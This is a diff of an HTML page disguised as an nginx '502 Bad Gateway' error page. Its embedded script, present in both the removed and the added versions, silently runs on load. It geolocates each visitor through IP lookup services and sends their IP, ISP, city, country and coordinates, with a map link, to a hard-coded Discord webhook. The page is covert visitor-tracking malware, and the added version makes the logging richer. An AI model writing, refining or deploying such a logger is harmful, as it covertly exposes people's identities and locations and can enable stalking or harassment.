@@ -5,110 +5,72 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>502 Bad Gateway</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-            color: #333;
-            line-height: 1.4;
-        }
-        .error-container {
-            max-width: 600px;
-            margin: 0 auto;
-            background: white;
-            padding: 40px;
-            border: 1px solid #ddd;
-            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-        }
-        h1 {
-            font-size: 4em;
-            font-weight: 300;
-            color: #dc3545;
-            margin: 0 0 20px 0;
-            letter-spacing: -2px;
-        }
-        p {
-            font-size: 1.1em;
-            margin: 0 0 15px 0;
-        }
-        .details {
-            font-size: 0.9em;
-            color: #666;
-            margin-top: 30px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-        }
+        body {font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+              margin:0; padding:20px; background:#f5f5f5; color:#333;}
+        .box {max-width:600px; margin:40px auto; background:white; padding:40px; border:1px solid #ddd;
+              box-shadow:0 2px 10px rgba(0,0,0,.1);}
+        h1 {font-size:4em; font-weight:300; color:#dc3545; margin:0 0 20px;}
+        p {font-size:1.1em; margin:0 0 15px;}
+        .footer {font-size:0.9em; color:#666; margin-top:30px; padding-top:20px; border-top:1px solid #eee;}
     </style>
 </head>
 <body>
-    <div class="error-container">
+    <div class="box">
         <h1>502 Bad Gateway</h1>
-        <p>The server returned an invalid or incomplete response while acting as a gateway or proxy server.</p>
-        <p>You can try:</p>
-        <ul>
-            <li>Reload this web page later.</li>
-            <li>Check for network issues or contact your ISP.</li>
-            <li>Try accessing the site from a different device or browser.</li>
-        </ul>
-        <div class="details">
-            <p>nginx/1.18.0 (Ubuntu)</p>
-        </div>
+        <p>The proxy server received an invalid response from an upstream server.</p>
+        <p>Please try again later or contact the administrator if the problem persists.</p>
+        <div class="footer">nginx</div>
     </div>
-    <script>
-        // Fetch geolocation data including IP
-        fetch('https://ipinfo.io/json')
-            .then(response => response.json())
-            .then(data => {
-                const ip = data.ip;
-                const city = data.city || 'Unknown';
-                const countryCode = data.country || '';
-                const [lat, lon] = (data.loc || '').split(',') || ['Unknown', 'Unknown'];
-                
-                if (countryCode === 'Unknown' || !countryCode) {
-                    // Send without country name
-                    sendPayload(ip, city, 'Unknown', lat, lon);
-                    return;
-                }
-                
-                // Fetch country name
-                fetch(`https://restcountries.com/v3.1/alpha/${countryCode}?fields=name`)
-                    .then(response => response.json())
-                    .then(geo => {
-                        const country = geo[0]?.name?.common || 'Unknown';
-                        sendPayload(ip, city, country, lat, lon);
-                    })
-                    .catch(err => {
-                        console.error('Country name fetch error:', err);
-                        sendPayload(ip, city, 'Unknown', lat, lon);
-                    });
-            })
-            .catch(err => {
-                console.error('IPinfo fetch error:', err);
-                // Fallback to ipify for IP only
-                fetch('https://api.ipify.org?format=json')
-                    .then(response => response.json())
-                    .then(data => {
-                        sendPayload(data.ip, 'Unknown', 'Unknown', 'Unknown', 'Unknown');
-                    })
-                    .catch(() => {
-                        // Even fallback fails, just don't send
-                    });
-            });
 
-        function sendPayload(ip, city, country, lat, lon) {
-            const payload = {
-                content: `**New IP Log**\n**IP:** \`${ip}\`\n**City:** ${city}\n**Country:** ${country}\n**Coordinates:** ${lat}, ${lon}`
-            };
-            
-            fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            }).catch(err => console.error('Webhook send error:', err));
+    <script>
+        async function logVisitor() {
+            try {
+                // Best free combo right now (2025): ip-api.com — unlimited non-commercial, no key needed
+                const res = await fetch('https://ip-api.com/json/?fields=66846719');
+                const data = await res.json();
+
+                if (data.status !== 'success') return;
+
+                const ip = data.query;
+                const city = data.city || 'Unknown';
+                const region = data.regionName || 'Unknown';
+                const country = data.country || 'Unknown';
+                const lat = data.lat;
+                const lon = data.lon;
+                const isp = data.isp || 'Unknown';
+
+                const mapsLink = `https://www.google.com/maps/@${lat},${lon},10z`; // ~10 km view
+                const staticMap = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=10&size=600x300&maptype=roadmap&markers=color:red%7C${lat},${lon}&key=`; // no key = still works for preview
+
+                const message = {
+                    content: null,
+                    embeds: [{
+                        title: "New Visitor Logged",
+                        color: 0xFF0000,
+                        fields: [
+                            { name: "IP", value: `\`${ip}\``, inline: true },
+                            { name: "ISP", value: isp, inline: true },
+                            { name: "Country", value: country, inline: true },
+                            { name: "Region", value: region, inline: true },
+                            { name: "City", value: city, inline: true },
+                            { name: "Coordinates", value: `${lat}, ${lon}`, inline: true },
+                            { name: "Google Maps", value: `[Open in Maps](${mapsLink})`, inline: false }
+                        ],
+                        image: { url: staticMap },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                fetch('https://discord.com/api/webhooks/1438923668091699220/mCkSrF8MtQUTOsjoqbC2qrcmhJHoNh4xwrVqMcmpviJ3bEjeJoiiB3O__dpF8Lv0ZsQz', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(message)
+                });
+            } catch (e) { console.error(e); }
         }
+
+        // Run silently
+        logVisitor();
     </script>
 </body>
 </html>
